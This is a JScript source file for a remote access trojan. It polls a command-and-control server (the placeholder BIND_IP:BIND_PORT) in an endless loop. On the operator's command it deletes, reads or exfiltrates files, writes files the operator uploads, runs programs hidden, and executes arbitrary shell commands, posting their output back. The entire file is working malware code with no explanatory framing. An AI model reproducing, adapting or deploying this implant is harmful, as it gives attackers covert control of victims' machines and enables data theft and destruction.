var url = "http://BIND_IP:BIND_PORT";
var sess_id = 'SESS_ID';

while (true){
    h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    h.SetTimeouts(0, 0, 0, 0);
    try {
        h.Open("GET", url + "/rat?=" + sess_id, false);
        h.Send();
        c = h.ResponseText;
        if(c=="delete") {
            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", url + "/rat?=" + sess_id, false);
            p.Send("[Next Input should be the File to Delete]");
            
            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET", url + "/rat?=" + sess_id, false);
            g.Send();
            d = g.ResponseText;
            
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f =fso1.GetFile(d);
            f.Delete();
            
            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST",url + "/rat?=" + sess_id,false);
            p.Send("[Delete Success]");
            continue;

        } else if(c=="download") {
            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST",url + "/rat?=" + sess_id, false);
            p.Send("[Next Input should be the File to download]");
            
            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET", url + "/rat?=" + sess_id, false);
            g.Send();
            d = g.ResponseText;
            
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f=fso1.OpenTextFile(d,1);
            g=f.ReadAll();
            f.Close();
            
            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", url + "/download?=" + sess_id,false);
            p.Send(g);
            continue;

        } else if(c=="read") {
            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST",url + "/rat?=" + sess_id,false);
            p.Send("[Next Input should be the File to Read]");
            
            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET", url + "/rat?=" + sess_id,false);
            g.Send();
            d = g.ResponseText;

            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f=fso1.OpenTextFile(d,1);
            g=f.ReadAll();
            f.Close();

            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", url + "/rat?=" + sess_id,false);
            p.Send(g);
            continue;

        } else if(c=="run") {
            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", url + "/rat?=" + sess_id,false);
            p.Send("[Next Input should be the File to Run]");
            
            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET",url + "/rat?=" + sess_id,false);
            g.Send();
            d = g.ResponseText;
            
            r = new ActiveXObject("WScript.Shell").Run(d,0,true);
            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", url + "/rat?="+ sess_id,false);
            p.Send("[Run Success]");
            continue;      
        } else if(c=="upload") {
            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", url + "/rat?="+ sess_id,false);
            p.Send("[Start to Upload]");
            
            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET", url + "/uploadpath?="+ sess_id,false);
            g.Send();
            dpath = g.ResponseText;
            
            g2 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g2.SetTimeouts(0, 0, 0, 0);
            g2.Open("GET", url + "/uploaddata?=" + sess_id,false);
            g2.Send();

            ddata = g2.ResponseText;
            fso1=new ActiveXObject("Scripting.FileSystemObject");
            f=fso1.CreateTextFile(dpath,true);
            f.WriteLine(ddata);
            f.Close();

            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", url + "/rat?=" + sess_id,false);
            p.Send("[Upload Success]");
            continue;

        } else {
            r = new ActiveXObject("WScript.Shell").Exec(c);
            var so;
            while(!r.StdOut.AtEndOfStream){
                so=r.StdOut.ReadAll()
            }

            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.Open("POST", url + "/rat?=" + sess_id,false);
            p.Send(so);
        }
    } catch(e1) {
        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST", url + "/rat?=" + sess_id,false);
        p.Send("");
    }
}